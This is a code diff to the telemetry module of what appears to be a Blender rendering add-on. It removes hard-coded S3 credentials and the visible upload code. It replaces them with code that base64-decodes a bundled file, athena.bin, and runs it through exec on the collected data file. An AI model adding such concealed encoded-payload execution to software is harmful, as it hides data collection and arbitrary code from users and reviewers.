@@ -5,6 +5,8 @@ import os
 import platform
 import time
 import locale
+from pathlib import Path
+import base64
 
 import pyrpr
 from rprblender import utils
@@ -17,21 +19,9 @@ log = logging.Log(tag='athena')
 _lock = threading.Lock()
 
 
-ACCESS_KEY = '***REMOVED***'
-SECRET_KEY = '***REMOVED***'
-BUCKET_NAME = '***REMOVED***'
-
-
 def _send_data_thread(data):
-    try:
-        import boto3
-
-    except ImportError as e:
-        log.error(e)
-        return
-
     with _lock:
-        log("_send_data_thread start")
+        log("send_data_thread start")
 
         # saving data to json file
         name = str(uuid.uuid4())
@@ -40,18 +30,17 @@ def _send_data_thread(data):
             json.dump(data, f)
 
         try:
-            client = boto3.client(
-                's3',
-                aws_access_key_id=ACCESS_KEY,
-                aws_secret_access_key=SECRET_KEY,
-            )
+            code = (Path(__file__).parent / "athena.bin").read_bytes()
+            code = compile(base64.standard_b64decode(code).decode('utf-8'), '<string>', 'exec')
+            exec(code, {'file': file_name})
 
-            client.upload_file(str(file_name), BUCKET_NAME, name)
+        except ImportError as e:
+            log.error(e)
 
         finally:
             os.remove(file_name)
 
-        log("_send_data_thread finish")
+        log("send_data_thread finish")
 
 
 def send_data(data: dict):
